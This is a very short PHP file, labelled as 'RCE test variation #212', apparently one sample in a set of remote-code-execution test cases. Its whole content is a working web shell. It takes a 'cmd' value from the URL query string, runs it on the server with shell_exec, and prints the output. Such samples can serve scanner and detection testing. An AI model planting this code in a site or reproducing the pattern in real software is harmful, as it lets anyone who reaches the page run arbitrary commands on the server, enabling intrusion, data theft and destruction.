<?php
// RCE test variation #212
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>